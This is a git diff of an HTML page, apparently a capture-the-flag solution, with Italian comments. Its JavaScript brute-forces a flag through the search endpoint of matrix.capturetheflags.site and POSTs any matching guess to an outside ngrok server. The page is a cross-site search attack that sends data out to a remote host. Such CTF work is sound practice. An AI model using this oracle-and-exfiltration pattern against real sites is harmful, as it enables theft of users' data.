@@ -5,18 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Brute Force Flag</title>
     <script>
-        const proxyUrl = 'http://127.0.0.1:5000/proxy?url='; // Modifica l'URL secondo il tuo server Flask
+        const myFlaskServer = 'https://d2f2-87-4-142-72.ngrok-free.app'; // Inserisci il tuo URL ngrok qui
 
         async function search(flag) {
             try {
-                const response = await fetch(proxyUrl + encodeURIComponent(`https://matrix.capturetheflags.site/search?s=${flag}`), {
+                const response = await fetch(`https://matrix.capturetheflags.site/search?s=${flag}`, {
                     method: 'GET'
                 });
-                
+
                 if (response.ok) {
-                    const result = await response.json();
-                    console.log('Risultato della ricerca:', result);
-                    // Controlla qui se la risposta contiene la flag
+                    const text = await response.text();
+                    console.log('Risultato della ricerca:', text);
+                    // Controlla qui se la risposta indica che hai trovato la flag
+                    if (text.includes('Risultato atteso')) { // Modifica questa condizione in base alla risposta attesa
+                        // Se hai trovato la flag, inviala al tuo server Flask
+                        await sendFlagToServer(flag);
+                    }
                 } else {
                     console.error('Errore nella richiesta:', response.status);
                 }
@@ -25,8 +29,28 @@
             }
         }
 
+        async function sendFlagToServer(flag) {
+            try {
+                const response = await fetch(`${myFlaskServer}/submit_flag`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ flag: flag })
+                });
+
+                if (response.ok) {
+                    console.log('Flag inviata con successo:', flag);
+                } else {
+                    console.error('Errore nell\'invio della flag:', response.status);
+                }
+            } catch (error) {
+                console.error('Errore nell\'invio della flag:', error);
+            }
+        }
+
         async function bruteForceFlag() {
-            const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}'; // Include caratteri speciali e maiuscole
+            const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!@#$%^&*()-_=+[];:,.<>?'; // Include caratteri speciali
             const flagPrefix = 'flag{'; // Inizia con flag{
             const flagLength = 32; // Lunghezza della flag attesa
             let flag = flagPrefix;
